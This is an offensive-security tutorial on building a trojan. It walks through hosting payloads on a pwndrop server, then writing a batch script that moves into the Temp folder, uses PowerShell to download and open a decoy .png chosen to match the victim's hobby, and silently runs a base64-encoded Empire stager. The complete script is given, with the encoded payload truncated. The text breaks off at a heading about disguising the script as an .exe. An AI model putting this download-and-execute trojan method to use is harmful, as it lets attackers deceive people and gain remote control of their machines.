# Client Side Attacks

## Resource Development

In this section we will be looking at how we can craft malicious resources to use against our targets.

### Developing Trojan Horses

We all know the story of the original Trojan Horse from Greek mythology. In cyber security a trojan is simply a malicious piece of code - for example a meterpreter reverse shell, empire stager, keylogger, custom reverse shell - which runs in the background behind an innocent file such as a .png .pdf or .exe

The idea is that the target will see the innocent side but not the malicious one - no sweaty Greek men need to be involved :relieved: 

Essentially a trojan needs to look and act like a normal file but at the same time execute malicious code in the background.

>[!NOTE]
>There are lots of ways to develop and deliver trojans - we will cover some of them which will hopefully be of use :smiley: 

#### Using Powershell in a Batch Script

The idea is simple - we will create a .bat script which will use powershell to download and execute an innocent file and then execute malicious code.

Once we have this working we will polish the look of the trojan to make it as believable as possible. Social engineering will greatly assist in getting the target to open the trojan but there are some tricks we can use to make it more likely that they will fall for it.

##### Serving Necessary Files

In order for this method to work the trojan will need to be able to download the necessary files from somewhere. We can serve these ourselves using an opensource file sharing service called [pwndrop](https://github.com/kgretzky/pwndrop)

>[!NOTE]
>We can use a cloud server to host pwndrop but in these notes we are working on a local area network

After we have cloned the pwndrop repo and navigated into it we can use `make` to prepare it for installation. We can then use `make install` to install it.

>[!IMPORTANT]
>We need to have go installed on our system for the installation of pwndrop to work - we can get this on kali using `sudo apt install golang-go`

Once we have installed pwndrop it will be running. We can stop, start and check its status using `service` commands such as `sudo service pwndrop stop` or we can use `/usr/local/pwndrop/pwndrop/stop`

We can now access the login panel of pwndrop via a web browser. Since we are working on a LAN we can just use the IP address of the server or `localhost` but if we have installed pwndrop on a cloud server which has a domain name associated with it we can use the domain name.

The admin panel is found at `http://localhost/pwndrop/` - we will need to change `localhost` to a domain name if working with it on the cloud and a domain we have purchased.

>[!TIP]
>The path to the admin panel can be changed in the settings once we have logged into pwndrop

When we first log into pwndrop we will need to create a username:password which we can use for subsequent access to it.

It is very easy to use and is mostly self explanatory.

One thing to notice is how pwndrop by default adds gibberish into the path of uploaded files. I find this makes urls less believable and therefore like to delete it - this can be done in the settings for each individual file.

![pwndrop1](/images/3.png)

In this example we are creating a trojan for a target who is interested in astrophotography. The .png is therefore related to this interest.

We will be using a simple empire stager as the malicious payload.

![empire1](/images/1.png)

![empire2](/images/2.png)

With our pwndrop server now serving we can access the .png file we need for the frontend of our trojan.

![pwndrop2](/images/4.png)

##### Creating the Batch Script

The .bat script we create will first of all use `cd %TEMP%` to navigate into the `Temp` directory. This is so the target will not see suspicious files appearing on their file system - most people never navigate to it.

It will then use powershell to download the innocent .png file we are serving. Since this powershell command will be executed from within a batch script we will need to explicitly state we want to use powershell: `Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"`

We will then open the .png file so the target believes they have just opened it in a normal way even though they have not. We can open it by simply using `witch-head.png`

Next we will execute the malicious code which in this case is the base64 encoded empire multi stager.

![trojan1](/images/5.png)

The following code is the complete batch script as run in this example:

```
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"
witch-head.png
powershell -nop -sta -w 1 -enc SQB<SNIP>AFM
```

Once we have crafted our malicious batch script and saved it as a .bat file we can try executing it.

![trojan3](/images/7.png)

![trojan4](/images/8.png)

At this point we have a working trojan - okay - not many if any people are going to open that dodgy looking batch file - though with good social engineering some will - so we will next work on making it look more legitimate.

##### Converting .bat to .exe and Adding an Icon

